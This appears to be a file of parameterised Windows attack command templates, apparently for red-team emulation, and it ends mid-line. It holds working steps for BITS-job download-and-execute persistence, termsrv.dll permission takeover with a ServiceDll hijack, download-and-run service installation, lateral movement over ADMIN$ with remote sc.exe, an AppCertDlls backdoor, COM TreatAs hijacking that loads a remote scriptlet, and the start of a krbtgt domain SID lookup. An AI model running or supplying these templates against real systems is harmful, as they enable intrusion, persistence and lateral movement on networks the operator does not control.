command_template:
bitsadmin.exe /create {bits_job_name}
bitsadmin.exe /addfile {bits_job_name} {remote_file} {local_file}
bitsadmin.exe /setnotifycmdline {bits_job_name} {command_path} NULL
bitsadmin.exe /resume {bits_job_name}
ping -n 5 127.0.0.1 >nul 2>&1
bitsadmin.exe /complete {bits_job_name}

$termsrvDll = "{termsrv_dll_path}"
$ACL = Get-Acl $termsrvDll
$permission = "{user_or_group}","FullControl","Allow"
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$ACL.SetAccessRule($accessRule)
Set-Acl -Path $termsrvDll -AclObject $ACL
if (-not (Test-Path "{malicious_dll_path}")) {
    Copy-Item -Path "{source_malicious_dll_path}" -Destination "{malicious_dll_path}" -Force
}
$registryPath = "{registry_key_path}"
if (Test-Path $registryPath) {
    Set-ItemProperty -Path $registryPath -Name "ServiceDll" -Value "{malicious_dll_path}"
} else {
    New-Item -Path $registryPath -Force
    Set-ItemProperty -Path $registryPath -Name "ServiceDll" -Value "{malicious_dll_path}"
}

powershell -Command "(New-Object System.Net.WebClient).DownloadFile('{download_url}', '{binary_path}')"
sc.exe create {service_name} binPath= "{binary_path}" start={startup_type} type={service_type}
sc.exe start {service_name}

copy "{local_binary_path}" "\\{remote_host}\ADMIN$\{remote_binary_name}"
sc.exe \\{remote_host} create {service_name} binPath= "C:\Windows\{remote_binary_name}" start={startup_type} type={service_type}
sc.exe \\{remote_host} start {service_name}

Copy-Item -Path "{malicious_dll_path}" -Destination "C:\Users\Public\backdoor.dll" -Force
reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls" /v "Backdoor" /t REG_EXPAND_SZ /d "C:\Users\Public\backdoor.dll" /f
if("{reboot}" -eq "true"){Restart-Computer}

# 步骤1：创建自定义恶意CLSID并关联到scrobj.dll
New-Item -Path 'HKCU:\SOFTWARE\Classes\{progid}' -Value '{description}' -Force;
New-Item -Path 'HKCU:\SOFTWARE\Classes\{progid}.1.00' -Value '{description}' -Force;
New-Item -Path 'HKCU:\SOFTWARE\Classes\{progid}\CLSID' -Value '{malicious_clsid}' -Force;
New-Item -Path 'HKCU:\SOFTWARE\Classes\{progid}.1.00\CLSID' -Value '{malicious_clsid}' -Force;
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{malicious_clsid}' -Value '{description}' -Force;
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{malicious_clsid}\InprocServer32' -Value 'C:\WINDOWS\system32\scrobj.dll' -Force;
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{malicious_clsid}\InprocServer32' -Name 'ThreadingModel' -PropertyType 'String' -Value 'Apartment' -Force;
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{malicious_clsid}\ProgID' -Value '{progid}' -Force;
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{malicious_clsid}\ScriptletURL' -Value '{script_url}' -Force;
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{malicious_clsid}\VersionIndependentProgID' -Value '{progid}' -Force;
# 步骤2：设置TreatAs重定向目标CLSID
New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\{target_clsid}' -Force;
New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\{target_clsid}' -Name 'TreatAs' -PropertyType 'String' -Value '{malicious_clsid}' -Force;
# 步骤3：触发劫持，启动目标COM对象
Start-Process -FilePath 'C:\Windows\System32\RUNDLL32.EXE' -ArgumentList '-sta "{target_clsid_or_progid}"' -WindowStyle Hidden

$domain_sid = '{domain_sid}'; if ($domain_sid -eq 'DEFAULT') { $domain = (Get-WmiObject Win32_ComputerSystem).Domain; $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value; $domain_sid = $krbtgtSID.Substring(0, $krbtgtSID.LastIndexOf('-')); }; $batchContent = @"
